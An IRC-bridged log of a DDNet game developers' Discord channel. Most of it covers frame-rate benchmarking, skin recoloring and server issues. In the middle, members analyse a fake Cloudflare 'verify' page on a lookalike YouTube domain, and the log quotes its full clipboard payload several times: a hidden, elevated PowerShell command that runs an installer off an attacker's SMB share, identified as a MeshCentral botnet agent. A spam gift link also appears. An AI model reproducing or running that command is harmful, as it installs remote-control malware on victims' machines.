16:17 < bridge_> <Solly (bun bun)> https://cdn.discordapp.com/attachments/293493549758939136/1359895111290458173/Screenshot_20250410-171726.png?ex=67f92484&is=67f7d304&hm=f1d2c10bc2d303851b9a175208dca609d231ae78ce5b8c8700ed868934be4af4&
16:18 < bridge_> <Solly (bun bun)> Unless me calculator is being used wrong
16:18 < bridge_> <Assa> maybe take the 390 microsecond average and not the total number of frametimes recorded?
16:19 < bridge_> <Assa> is that table really that unreadable?
16:22 < bridge_> <Assa> ```
16:22 < bridge_> <Assa> Number Frametimes New w. Lambda: 13079
16:22 < bridge_> <Assa> Average New w. Lambda:             386.1872467314015 µs
16:22 < bridge_> <Assa> Average FPS New w. Lambda:         2589.4174612542647
16:23 < bridge_> <Assa> Max New w. Lambda:                 665 µs
16:23 < bridge_> <Assa> Min New w. Lambda:                 270 µs
16:23 < bridge_> <Assa> Number Frametimes New n. Lambda: 13252
16:23 < bridge_> <Assa> Average New n. Lambda:             386.839118623604 µs
16:23 < bridge_> <Assa> Average FPS New n. Lambda:         2585.0539716822277
16:23 < bridge_> <Assa> Max New n. Lambda:                 663 µs
16:23 < bridge_> <Assa> Min New n. Lambda:                 258 µs
16:23 < bridge_> <Assa> ```
16:23 < bridge_> <Assa> ofc and then discord doesn't format it right anyway
16:24 < bridge_> <Solly (bun bun)> 200us difference is nothing but
16:24 < bridge_> <Solly (bun bun)> There shouldn't be anything
16:24 < bridge_> <Assa> might be noise
16:26 < bridge_> <Solly (bun bun)> You can limit the amount of time / second DDNet has
16:27 < bridge_> <Solly (bun bun)> Using... some random program
16:27 < bridge_> <Assa> some random engine you mean?
16:27 < bridge_> <Solly (bun bun)> Non
16:27 < bridge_> <Solly (bun bun)> Probably like "theprogram ./DDNet"
16:28 < bridge_> <Solly (bun bun)> There must be someone who has done that
16:28 < bridge_> <Solly (bun bun)> Theprogram has to be real time scheduled though
16:28 < bridge_> <Solly (bun bun)> To stop and start the program
16:29 < bridge_> <Solly (bun bun)> Maybe Linux has a built-in way to do it
17:05 < bridge_> <Assa> what does `Graphics()->BlendNormal();` do?
17:08 < bridge_> <Assa> I missed this in one case, and this was causing slightly higher frametimes
17:08 < bridge_> <Assa> took me now 2 hours to debug
18:01 < bridge_> <2trg_37765> AHAHHAAH 😭😭  https://www.youtude.net/watch?v=i50wel2lVsw
18:02 < bridge_> <oxyzo.> tf is youtude
18:02 < bridge_> <oxyzo.> @Discord Mod
18:02 < bridge_> <oxyzo.> every channel:nouis:
18:04 < bridge_> <teero777> XDDDDDDDDDD
18:04 < bridge_> <teero777> https://cdn.discordapp.com/attachments/293493549758939136/1359922026713976985/image.png?ex=67f93d95&is=67f7ec15&hm=c87fa41ca9d3f3bed0e2a6eb4eb7f1ae5264a5825e51e87726b7dda2c0ba89c2&
18:04 < bridge_> <teero777> it's just a troll ig xd
18:05 < bridge_> <teero777> a fake cloudflare menu
18:05 < bridge_> <jxsl13> was that the link?
18:05 < bridge_> <teero777> yea
18:05 < bridge_> <jxsl13> would be weird if youtube used cloudflare
18:05 < bridge_> <jxsl13> they have their own shit
18:05 < bridge_> <jxsl13> and own anticaptcha
18:06 < bridge_> <oxyzo.> "hi this is google uuh can you install this miner on your pc so you can use google"
18:06 < bridge_> <teero777> it is putting this in your clipboard: || powershell -Command "Start-Process cmd -ArgumentList '/c net use \\dfjkhdsljkfhsd.com\shear /user:WORKGROUP\smbusr aabb1234! && \\dfjkhdsljkfhsd.com\shear\dc -fullinstall' -windowstyle hidden -Verb RunAs; # Cloudflare verification (Ray ID: 90b0e54eb8bdaasd84) || This is a virus please don't execute this
18:07 < bridge_> <teero777> and then asking for you to execute it to verify
18:07 < bridge_> <jxsl13> you can censor the domain
18:07 < bridge_> <oxyzo.> you press verify and it says "successfully"
18:08 < bridge_> <teero777> it is putting this in your clipboard: || powershell -Command "Start-Process cmd -ArgumentList '/c net use \\viruslink.com\shear /user:WORKGROUP\smbusr aabb1234! && \\viruslink.com\shear\dc -fullinstall' -windowstyle hidden -Verb RunAs; # Cloudflare verification (Ray ID: 90b0e54eb8bdaasd84) || This is a virus please don't execute this
18:08 < bridge_> <jxsl13> so that nobody even remotely tries to execute
18:08 < bridge_> <jxsl13> ❤️
18:08 < bridge_> <teero777> just leads to a server from someone ig
18:08 < bridge_> <teero777> https://cdn.discordapp.com/attachments/293493549758939136/1359923038077976789/image.png?ex=67f93e86&is=67f7ed06&hm=3b404faaac3d0555b676dd79f58aeeeb80c373ee89edeeaacb060b51746842b4&
18:08 < bridge_> <teero777> just leads to a server from the owner ig
18:08 < bridge_> <teero777> https://cdn.discordapp.com/attachments/293493549758939136/1359923038077976789/image.png?ex=67f93e86&is=67f7ed06&hm=3b404faaac3d0555b676dd79f58aeeeb80c373ee89edeeaacb060b51746842b4&
18:09 < bridge_> <teero777> https://github.com/Ylianst/MeshCentral
18:09 < bridge_> <teero777> yea it's a remote monitoring/control scam
18:15 < bridge_> <teero777> this guy made this thing yesterday and is already distributing it lmao.
18:15 < bridge_> <teero777> although i don't think it has a high success rate
18:15 < bridge_> <teero777> i guess he is just building his botnet
18:15 < bridge_> <pioooooo> how do you know
18:16 < bridge_> <pioooooo> yesterday*
18:16 < bridge_> <Ewan> 💀
18:16 < bridge_> <pioooooo> did u already hacked in
18:16 < bridge_> <pioooooo> did u already hack in
18:18 < bridge_> <teero777> you can check since when the domain is up
18:20 < bridge_> <pioooooo> :jaouis:
18:21 < bridge_> <Ewan> did anyone use the acid tool yet
18:21 < bridge_> <Ewan> idk what the domain originally was
18:23 < bridge_> <fokkonaut> yes
18:36 < bridge_> <learath2> youtude.net is a great domain ngl, it looks fine at a quick skim
18:40 < bridge_> <fokkonaut> whats youtude
18:52 < bridge_> <jxsl13> it's youtube with a D
18:53 < bridge_> <jxsl13> perfect for scamming people
18:58 < bridge_> <Ewan> yea
18:59 < bridge_> <Ewan> so.. do we like the random malicious domains more than we like fast flux
19:06 < bridge_> <gabbcs> Hey, you guys know why Monster and teeware servers are not registering in the master?
19:07 < bridge_> <fellni110> is it possible to make an auto unfreeze using the lua api in ATH?
19:08 < bridge_> <Ewan> what’s ATH
19:08 < bridge_> <Ewan> any lua api for a client is almost definitely a cheat btw
19:08 < bridge_> <Ewan> not an exhaustive statement
19:08 < bridge_> <learath2> Perhaps there is an issue with the legacy masterserver
19:09 < bridge_> <learath2> ATH unless they added back the input capabilities is legit
19:09 < bridge_> <gabbcs> Oh, i didnt know
19:09 < bridge_> <gabbcs> Thx man
19:09 < bridge_> <learath2> No, that's why we unbanned the client. The author agreed to remove input capabilities from the lua api
19:11 < bridge_> <learath2> Also quite funny that you'd ask pretty much how to make a bot on the official discord 😄
19:11 < bridge_> <katondda> how to use callvote kick 
19:11 < bridge_> <katondda> when me use e.g. callvote kick Marou he kicking random player
19:11 < bridge_> <fellni110> I just want to study Lua
19:11 < bridge_> <Ewan> get love2d
19:12 < bridge_> <Ewan> or gmod
19:12 < bridge_> <Ewan> or roblox
19:12 < bridge_> <Ewan> or a life
19:12 < bridge_> <learath2> Guys how do I rob a bank? I want to study stealth
19:12 < bridge_> <fellni110> But it's more interesting
19:12 < bridge_> <katondda> or
19:12 < bridge_> <katondda> https://cdn.discordapp.com/attachments/293493549758939136/1359939145870479471/image.png?ex=67f94d86&is=67f7fc06&hm=a431a05a4f67c224d77f68dc5a67bd8dde255d699b57754b31d7e34a654e755d&
19:12 < bridge_> <katondda> https://cdn.discordapp.com/attachments/293493549758939136/1359939146117808310/image.png?ex=67f94d86&is=67f7fc06&hm=b7264ebe80d58a035966dac378ec7d374c1f485642d3c9d20af83f234b9e36cb&
19:12 < bridge_> <Ewan> 5head
19:13 < bridge_> <kebscs> "invalid client id to kick"
19:13 < bridge_> <Ewan> i’d do that thru the vote menu. f1 commands usually take player IDs
19:13 < bridge_> <katondda> https://cdn.discordapp.com/attachments/293493549758939136/1359939347226558514/image.png?ex=67f94db6&is=67f7fc36&hm=a35ebba94b20028429bb50205a4232941e200f0c551da68d925ddaead99d7d2b&
19:13 < bridge_> <Ewan> not the same
19:13 < bridge_> <Ewan> that’s his name
19:13 < bridge_> <katondda> im making custom client
19:13 < bridge_> <katondda> ty
19:13 < bridge_> <fellni110> give me the TeeTown discord server, please
19:14 < bridge_> <Ewan> 🥱
19:14 < bridge_> <learath2> Hm, it seems up for me, I'm not sure, do you know who was hosting these servers?
19:14 < bridge_> <gabbcs> Me
19:15 < bridge_> <learath2> Can you check if you can find them with the vanilla 0.6 client?
19:15 < bridge_> <gabbcs> Theyre working Fine some days ago
19:15 < bridge_> <gabbcs> I aint home now, but when i Go home i Will check
19:16 < bridge_> <Ewan> np, the player ID can be found by turning on some setting (cl_nameplate_show_id or something like that? probably putting “id” and tab completing would get you the command, and then just turn it on obv)
19:16 < bridge_> <Ewan> i can’t remember if the feature to show it in chat falls under the same setting
19:17 < bridge_> <katondda> ty
19:17 < bridge_> <katondda> np
19:18 < bridge_> <fellni110> GIVE ME DISCORD SERVER TEETOWN
19:19 < bridge_> <Ewan> 😴
19:21 < bridge_> <Solly (bun bun)> i dont think you need to hide the randomly generated ray id
19:21 < bridge_> <teero777> yea ik
19:21 < bridge_> <Solly (bun bun)> you should hide the malicious url at the top
19:22 < bridge_> <katondda> hi
19:22 < bridge_> <teero777> where?
19:22 < bridge_> <Solly (bun bun)> https://cdn.discordapp.com/attachments/293493549758939136/1359941605892817088/image.png?ex=67f94fd1&is=67f7fe51&hm=eb171f65c0373b4c6a6c3362574797cefae199d4b8a410f212b2c4aa54c75fd2&
19:22 < bridge_> <teero777> youtube.com?
19:22 < bridge_> <always> thats not malicious
19:22 < bridge_> <Solly (bun bun)> (its a /j)
19:22 < bridge_> <always> makes cents
19:22 < bridge_> <teero777> crazy humor
19:22 < bridge_> <Solly (bun bun)> no i got no money for my joke
19:23 < bridge_> <Solly (bun bun)> i just played irish snap
19:23 < bridge_> <Solly (bun bun)> my hands are bleeding alot
19:23 < bridge_> <Solly (bun bun)> crazy stuff
19:24 < bridge_> <always> thats fun
19:25 < bridge_> <learath2> actually did anyone copy off what the "verification" thing was? I wonder what they were trying to get you to paste into the run prompt
19:27 < bridge_> <learath2> These teehistorian issues are filling my tool with stupid ugly workarounds
19:27 < bridge_> <Solly (bun bun)> # DO NOT PASTE THIS INTO WIN+R
19:27 < bridge_> <Solly (bun bun)> `powershell -Command "Start-Process cmd -ArgumentList '/c net use \\dfjkhdsljkfhsd.com\shear /user:WORKGROUP\smbusr aabb1234! && \\dfjkhdsljkfhsd.com\shear\dc -fullinstall' -windowstyle hidden -Verb RunAs; # Cloudflare verification (Ray ID: 90b0e54eb8bdaasd84)`
19:27 < bridge_> <Solly (bun bun)> # DO NOT PASTE THIS INTO WIN+R
19:27 < bridge_> <Solly (bun bun)> ||`powershell -Command "Start-Process cmd -ArgumentList '/c net use \\dfjkhdsljkfhsd.com\shear /user:WORKGROUP\smbusr aabb1234! && \\dfjkhdsljkfhsd.com\shear\dc -fullinstall' -windowstyle hidden -Verb RunAs; # Cloudflare verification (Ray ID: 90b0e54eb8bdaasd84)`||
19:27 < bridge_> <learath2> curious
19:28 < bridge_> <Solly (bun bun)> idk what the heck is going on
19:28 < bridge_> <learath2> It's connecting to a samba share and running something off of it
19:28 < bridge_> <Solly (bun bun)> `dfjkhdsljkfhsd.com` interseting domain
19:28 < bridge_> <learath2> Can I be assed set up smb so I can take a look at what they are trying to get you to run?
19:28 < bridge_> <learath2> hmmm
19:28 < bridge_> <Solly (bun bun)> i dont get why a lot of viruses go to so much effort to hide, just a payload
19:29 < bridge_> <Solly (bun bun)> 1 step is enough to get past antiviruses which look at the executable or command
19:29 < bridge_> <Solly (bun bun)> and not enough to get past antiviruses which look at what the executable is doing
19:29 < bridge_> <Solly (bun bun)> (those 2 msgs are same size nice)
19:31 < bridge_> <learath2> Very curious choice to use SMB of all things
19:31 < bridge_> <Solly (bun bun)> yeah
19:31 < bridge_> <Solly (bun bun)> https://cdn.discordapp.com/attachments/293493549758939136/1359943984205660393/image.png?ex=67f95208&is=67f80088&hm=36003c0da75aba0bd607bae0557da6ca4fdaa862b7fd7ee168d08b49797215fa&
19:31 < bridge_> <Solly (bun bun)> would be nice if that worked
19:33 < bridge_> <learath2> It's probably not a very smart person running this operation, could probably bruteforce this
19:33 < bridge_> <Solly (bun bun)> i cant seem to mount it either
19:33 < bridge_> <learath2> Be careful btw
19:34 < bridge_> <Solly (bun bun)> can mounting something be dangerous
19:34 < bridge_> <learath2> I do not know, hence the be careful 😄
19:34 < bridge_> <Solly (bun bun)> i wouldnt think so unless there was a vulrnability (which this isnt explotiing)
19:34 < bridge_> <learath2> it'd be hilarious if it's an SMB 0-day exploit
19:34 < bridge_> <Solly (bun bun)> and its also targetting window
19:35 < bridge_> <Solly (bun bun)> z
19:36 < bridge_> <learath2> There was a goof here a couple months ago trying to get me to run his "game", that was fun to reverse engineer
19:36 < bridge_> <Solly (bun bun)> ive never really reverse engineered viruses
19:36 < bridge_> <Solly (bun bun)> given i could figure out how to mount this
19:36 < bridge_> <Solly (bun bun)> would be fun to do
19:36 < bridge_> <Solly (bun bun)> if it didnt use arcane tools like smb i could do it xd
19:40 < bridge_> <totar> what is this?
19:40 < bridge_> <Solly (bun bun)> `dfjkhdsljkfhsd.com`
19:40 < bridge_> <Solly (bun bun)> best domain name
19:41 < bridge_> <Solly (bun bun)> <https://github.com/Ylianst/MeshCentral>
19:41 < bridge_> <Solly (bun bun)> maybe its a bot net
19:41 < bridge_> <learath2> I'm in, let's see what this dc is
19:42 < bridge_> <Solly (bun bun)> woaw
19:42 < bridge_> <Solly (bun bun)> it probably installs mesh central then
19:44 < bridge_> <learath2> dc.exe is a meshcentral installer it seems, and there sems to be an embedded script in there that does something
19:46 < bridge_> <teero777> @sollybunny i literally censored the domain so no one executes this and you put # do not execute
19:46 < bridge_> <teero777> bruh
19:47 < bridge_> <Solly (bun bun)> they wanted to know the command xd
19:47 < bridge_> <oxyzo.> # do execute this:
19:47 < bridge_> <oxyzo.> :nouis:
19:47 < bridge_> <learath2> Good idea to delete that just incase someone suffers from extremely low IQ
19:47 < bridge_> <Solly (bun bun)> sure
19:47 < bridge_> <oxyzo.> # do execute this:
19:47 < bridge_> <oxyzo.> -# :nouis:
19:47 < bridge_> <Solly (bun bun)> whered it go
19:47 < bridge_> <Solly (bun bun)> [censored domain name]
19:47 < bridge_> <Solly (bun bun)> best domain name
19:47 < bridge_> <Solly (bun bun)> oh you deletedit
19:47 < bridge_> <totar> I think it's legit software, why would they have a 40 part video series? https://www.youtube.com/@MeshCentral/videos
19:48 < bridge_> <Solly (bun bun)> me has virus now
19:48 < bridge_> <teero777> yea ofc, its just a guy having fun making a big botnet
19:48 < bridge_> <teero777> he started yesterday xd
19:48 < bridge_> <Solly (bun bun)> wait is the whole thing a sham?
19:48 < bridge_> <learath2> It's probably legit software, just being used by this dude
19:48 < bridge_> <Solly (bun bun)> the videos are 2/3 years old its not just
19:48 < bridge_> <Solly (bun bun)> for youdood
19:52 < bridge_> <traxxxes_> @everyone steam gift 50$ - [steamcommunity.com/gift-card/pay/50](https://u.to/8U05Ig )
19:54 < bridge_> <Solly (bun bun)> darn
19:56 < bridge_> <Solly (bun bun)> [xx/69] when you edit a componenet header in tclient u get 69 :)
19:56 < bridge_> <learath2> `addCompressedModule('toaster',` very curious things in here 😄
19:58 < bridge_> <Solly (bun bun)> toaster!!
19:59 < bridge_> <learath2> Somewhere in this bundle there has to be some authentication keys to let this new drone join the swarm
20:00 < bridge_> <kebscs> its a legit software, the hacker just uses it for malicious purposes
20:00 < bridge_> <Ewan> i think so
20:00 < bridge_> <Ewan> see here
20:00 < bridge_> <learath2> Already got it, digging around in it
20:00 < bridge_> <Ewan> sry
20:01 < bridge_> <Ewan> i read top to bottom
20:01 < bridge_> <Ewan> it’s very easy
20:01 < bridge_> <Solly (bun bun)> darn i had to have mine deleted
20:01 < bridge_> <Solly (bun bun)> ghasp
20:01 < bridge_> <Ewan> very common
20:02 < bridge_> <Ewan> it’s a windows network share URL, CIFS extends SMB so explorer can use it by default ig
20:02 < bridge_> <learath2> Any idea why it's any better than just fetching through http the virus?
20:02 < bridge_> <Ewan> i guess http is too predictable
20:02 < bridge_> <Ewan> too often explored of an avenue
20:03 < bridge_> <Ewan> who’s looking for malware distributed via. network share
20:03 < bridge_> <learath2> `MeshName=discordspam`
20:03 < bridge_> <learath2> What an uninspired loser
20:03 < bridge_> <Ewan> also works on windows by default
20:04 < bridge_> <Ewan> which is prob the #1 thing
20:04 < bridge_> <Ewan> for them
20:04 < bridge_> <learath2> Imagine spending all this time collecting bots for a swarm, to spam discord
20:04 < bridge_> <Ewan> i think they probably get paid
20:05 < bridge_> <learath2> Seems it's a croatian or serbian guy runing the operation
20:05 < bridge_> <Solly (bun bun)> why cant people stop making viruses
20:05 < bridge_> <Solly (bun bun)> (ie be not evil human beings)
20:06 < bridge_> <learath2> Or maybe there is no meaning to the order of these languages now that I think about it
20:06 < bridge_> <.isyxmn.> its running for 5 minutes and its still not done
20:06 < bridge_> <.isyxmn.> https://cdn.discordapp.com/attachments/293493549758939136/1359952629933019417/2025-04-10_20.05.14.png?ex=67f95a15&is=67f80895&hm=66c6e0df5e395157d6c36a7d85b9d5eb212dfe26eff1c9ebd0321ee4459785e6&
20:06 < bridge_> <.isyxmn.> oh my god
20:07 < bridge_> <oxyzo.> sols rng
20:07 < bridge_> <Solly (bun bun)> because result never == d
20:07 < bridge_> <.isyxmn.> yes
20:07 < bridge_> <.isyxmn.> its
20:07 < bridge_> <.isyxmn.> 1 in 10000000000000
20:07 < bridge_> <.isyxmn.> or sum
20:07 < bridge_> <Solly (bun bun)> becuase d == "unknown" not ["unknown"]
20:08 < bridge_> <oxyzo.> :nouis:
20:08 < bridge_> <Solly (bun bun)> so when it picks "unknown" with choices, then takes [0] its "u"
20:08 < bridge_> <Solly (bun bun)> so it can never exit
20:08 < bridge_> <.isyxmn.> its not a table
20:08 < bridge_> <learath2> https://www.youtube.com/watch?v=2KdoTpFnV1g seems someone else stumbled upon this before
20:08 < bridge_> <.isyxmn.> well it works when it has a higher chance
20:09 < bridge_> <Solly (bun bun)> oh right choices
20:09 < bridge_> <Solly (bun bun)> scrap that
20:09 < bridge_> <Ewan> need more workers
20:09 < bridge_> <Solly (bun bun)> but 0.000000000000000001 == 0
20:09 < bridge_> <.isyxmn.> yeah
20:09 < bridge_> <.isyxmn.> https://cdn.discordapp.com/attachments/293493549758939136/1359953474271449289/2025-04-10_20.09.19.png?ex=67f95ade&is=67f8095e&hm=cd3e9d58b401650514056f09e2f32a5d13caaf59253d5a6e91c4c0499aaeffe3&
20:09 < bridge_> <learath2> Funnily enough the "virus" in the video uses a http request, not SMB 😄
20:09 < bridge_> <Solly (bun bun)> also no
20:10 < bridge_> <Solly (bun bun)> its just really small tho
20:11 < bridge_> <.isyxmn.> yea
20:11 < bridge_> <.isyxmn.> asf
20:12 < bridge_> <Ewan> floating point comparison is a mixed bag
20:13 < bridge_> <learath2> I guess the person/persons/company developing MeshCentral isn't stupid enough to have any control credentials within the agent, so my investigation comes to an end. Overall I rate this virus 3/10. Very uninspired use of the botnet, there is no novel virus either just commercial software abused
20:13 < bridge_> <Ewan> yeah
20:14 < bridge_> <Ewan> i saw an iOS virus the other day
20:14 < bridge_> <learath2> `MeshName=youtube` they are running one more operation of the same kind on the same server
20:14 < bridge_> <Ewan> more of an elaborate phishing scheme
20:14 < bridge_> <Ewan> but
20:14 < bridge_> <Ewan> lol
20:15 < bridge_> <teero777> what would a novel virus be? xd
20:16 < bridge_> <Ewan> why are you asking him to define novel? that is the definition
20:16 < bridge_> <teero777> give an example of novel virus
20:16 < bridge_> <Ewan> something new & not easily identified
20:16 < bridge_> <teero777> something you'd never expect?
20:16 < bridge_> <Ewan> anything making use of new technology or smth
20:16 < bridge_> <Ewan> new technique
20:17 < bridge_> <learath2> I'm not telling you, I might need it when/if I have to go over to the dark side
20:17 < bridge_> <teero777> oki :3
20:17 < bridge_> <learath2> I'll be taking over the world, none of this discordspam bs
20:17 < bridge_> <Ewan> i think discord is just very easy to exploit
20:17 < bridge_> <Ewan> low hanging fruit
20:17 < bridge_> <Ewan> easier than Facebook
20:17 < bridge_> <Ewan> everyone is already watching the chat
20:18 < bridge_> <Ewan> very few account verification restrictions on most servers
20:18 < bridge_> <teero777> i will wait
20:18 < bridge_> <learath2> This meshcentral thing seems to be open source. I might take a peek over the code, see if there is a weakness in the agent websocket to DoS this operation into oblivion
20:18 < bridge_> <Assa> When I checkout DDNet 19.1 and measure frametimes, and then measure ddnet 19.2, then optimize the shit out of ddnet 19.2, I still have worse FPS, repeatedly 😦
20:18 < bridge_> <Assa> 
20:18 < bridge_> <Assa> I wasn't able to figure out, which change I did that caused that, please send help
20:18 < bridge_> <Ewan> Do it
20:19 < bridge_> <teero777> use a profiler? xd
20:19 < bridge_> <learath2> Actually no, nvm. I won't be doing that. I don't want random loser to put a hit out on me on the darkweb
20:19 < bridge_> <Assa> At least my optimizations seems to have worked, but not to the extend I wanted them to
20:20 < bridge_> <teero777> you can still improve the physics 15x :troll:
20:20 < bridge_> <learath2> Well if they made the fps worse, then they didn't work, no?
20:20 < bridge_> <robyt3> Instead of measuring the FPS, what if you measure only the time that the relevant old and new code takes? i.e. `time_get_nanoseconds()` before and after
20:20 < bridge_> <Assa> optimizations compared to 19.2, all I pushed so far are just rewrites and cleanups
20:21 < bridge_> <learath2> If your changes are in distinct commits, this is a very good time to use `git bisect`
20:21 < bridge_> <Ewan> :kek:
20:21 < bridge_> <Ewan> you’ll be fine
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠)
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 30s left
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 25s left
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 20s left
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 15s left
20:21 < bridge_> <oxyzo.> ddnet is getting deleted
20:21 < bridge_> <syrinok> You already have random losers hitting on you on the clearweb
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 10s left
20:21 < bridge_> <oxyzo.> no more blockers
20:21 < bridge_> <oxyzo.> no more hackers
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 5s left
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 4s left
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 3s left
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 2s left
20:21 < bridge_> <oxyzo.> no more bad ping servers
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 1s left
20:21 < bridge_> <DDNet> oxyzo called for vote to kick DDNet#1107 (😠) — 0s left
20:21 < bridge_> <DDNet> Vote passed. DDNet#1107 kicked by vote (😠)
20:22 < bridge_> <learath2> When the next version of DDNet comes out, I'm sure someone will send a hit squad because of #10018
20:22 < bridge_> <DDNet> https://github.com/ddnet/ddnet/pull/10018
20:22 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given)
20:22 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 30s left
20:22 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 25s left
20:22 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 20s left
20:22 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 15s left
20:22 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 10s left
20:23 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 5s left
20:23 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 4s left
20:23 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 3s left
20:23 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 2s left
20:23 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 1s left
20:23 < bridge_> <DDNet> Jupstar ✪ called for vote to kick jupeyy_keks (No reason given) — 0s left
20:23 < bridge_> <DDNet> Vote passed. jupeyy_keks kicked by vote (No reason given)
20:23 < bridge_> <syrinok> Honestly, I'm still unhappy with the results, could be better
20:23 < bridge_> <learath2> This was quite enjoyable to dig around in actually. I should get back to doing some reverse engineering sometime
20:23 < bridge_> <learath2> I was talking with mr freddie today, I noticed the 0.7 way is actually probably what one thinks of when told to "recolor" a skin
20:23 < bridge_> <Jupstar ✪> ban evasion
20:24 < bridge_> <syrinok> I swear it used to be more like that at one point, and I refuse to believe I'm crazy
20:24 < bridge_> <Jupstar ✪> Ofc, one always complains
20:24 < bridge_> <learath2> https://ddnet.org/skins/skin/community/ahl_WarfoxOrangeGlow.png look at this skin. If I tell you I want a purple version of this, would you tint everything purple or replace the orange with purple?
20:24 < bridge_> <syrinok> Replace orange
20:25 < bridge_> <syrinok> But we get the whole skin purple for fun
20:25 < bridge_> <learath2> Exactly, the way 0.6/ddnet recolors skins isn't really "recoloring" it's more like throwing paint over a skin
20:26 < bridge_> <Ewan> Racist feature
20:26 < bridge_> <syrinok> I dare say we need options, or just bandaid fix it and hope most people are sane
20:26 < bridge_> <learath2> If we completely change it to the 0.7 way of recoloring I believe I would get shot
20:26 < bridge_> <syrinok> I'll take the blame honestly
20:27 < bridge_> <syrinok> Idk who tf would shoot you tbh, it's just better
20:27 < bridge_> <learath2> We can maybe talk about having flags for it, e.g. you tell the server how you want your skin recolored
20:27 < bridge_> <syrinok> Better yet, I'll take full credit for the change
20:27 < bridge_> <syrinok> so I get all the happy updoots
20:28 < bridge_> <Ewan> You’re enough of a target
20:28 < bridge_> <Ewan> Not anymore I guess
20:28 < bridge_> <learath2> We send a `NetBool` for `m_UseCustomColor` which is an entire integer in reality. We can shove flags in there in a backwards compatible way methinks
20:28 < bridge_> <Ewan> No blue name 😳
20:28 < bridge_> <Ewan> when did that happen
20:28 < bridge_> <syrinok> It's my secret power
20:29 < bridge_> <learath2> Ill try to send a 2 or a 4, see what the server does
20:30 < bridge_> <Ewan> yea why don’t you just change it to NetIntegerVariant & an accompanying field describes the type, bool if absent
20:30 < bridge_> <Ewan> or smth like that
20:30 < bridge_> <Ewan> packing an int into a type called boolean is sketchy
20:31 < bridge_> <learath2> It's a teeworlds varint, so it's fine for a bool, it'll get turbocompressed anyway
20:31 < bridge_> <Ewan> ah
20:31 < bridge_> <learath2> ok, I'm starving, cya'll
20:32 < bridge_> <Ewan> see ya
20:32 < bridge_> <Ewan> eat something good
20:32 < bridge_> <learath2> actually I need to figure out how to handle these broken teehistorian files :/
20:32 < bridge_> <learath2> ok, food first, then weird teehistorian files
20:32 < bridge_> <syrinok> gl
20:33 < bridge_> <Ewan> maybe i should eat
20:33 < bridge_> <syrinok> go eat some cactus
20:33 < bridge_> <learath2> actually in a kfc kinda mood ngl
20:34 < bridge_> <syrinok> KFC in 🇺🇸 sux, or at least where I live
20:34 < bridge_> <Ewan> fast food is complete trash now
20:34 < bridge_> <Ewan> i could tolerate it as a kid
20:34 < bridge_> <syrinok> Ya I can't even stand mcdonalds anymore
20:34 < bridge_> <Ewan> whether that’s my perception or the quality I can’t say
20:34 < bridge_> <Ewan> but yea
20:35 < bridge_> <Ewan> even if it tastes good 1/3 of the time i wanna curl in a ball afterwards
20:35 < bridge_> <syrinok> I'd say 80% quality issues
20:35 < bridge_> <learath2> fast is the only reason I ever eat fast food
20:35 < bridge_> <Ewan> i just forgo the whole thing usually
20:35 < bridge_> <Ewan> caffeine + amphetamine
20:35 < bridge_> <Ewan> and then i eat dinner and sleep
20:35 < bridge_> <learath2> bro wired
20:35 < bridge_> <Ewan> terrible for your metabolism and long term health tho
20:35 < bridge_> <Ewan> don’t do it
20:36 < bridge_> <Ewan> also creates a crazy crash unless u snack in the daytime
20:36 < bridge_> <Ewan> i eat small oranges and granola bar
20:36 < bridge_> <learath2> got a burrito instead
20:36 < bridge_> <Ewan> solid option
20:37 < bridge_> <Ewan> i love a burrito sometimes
20:38 < bridge_> <Ewan> i would eat them too often in the past tho
20:38 < bridge_> <Ewan> too easy to dismiss the idea
20:43 < bridge_> <Assa> I wonder if #10020 is causing my issues
20:43 < bridge_> <DDNet> https://github.com/ddnet/ddnet/pull/10020
20:44 < bridge_> <Jupstar ✪> which issues do youhave
20:46 < bridge_> <Assa> less frames
20:46 < bridge_> <Ewan> why don’t you profile it?
20:47 < bridge_> <Ewan> it is not hard
20:47 < bridge_> <Jupstar ✪> i doubt that changing 2 vars has such an impact
20:47 < bridge_> <Ewan> ubuntu user right? Qt Creator has a GUI profiler that’s pretty good
20:47 < bridge_> <Jupstar ✪> static vars are usually worse
20:47 < bridge_> <Assa> ye, step one is grab my laptop
20:47 < bridge_> <Ewan> linux only
20:47 < bridge_> <Assa> I also doubt that this is the issue
20:48 < bridge_> <Assa> <-- mixed user
20:48 < bridge_> <Ewan> if ur on Windows then you more or less have to use Visual Studio
20:48 < bridge_> <Ewan> if u want a gui
20:49 < bridge_> <chairn> apply lemon juice on your face to be invisible to cameras
20:49 < bridge_> <Ewan> :kek:
20:50 < bridge_> <Ewan> i heard sulfuric acid is actually better for that. they haven’t used lemon juice since every robber had striped jumpsuits
20:50 < bridge_> <Ewan> i heard sulfuric acid is actually better for that. they haven’t used lemon juice since every robber had a striped jumpsuit
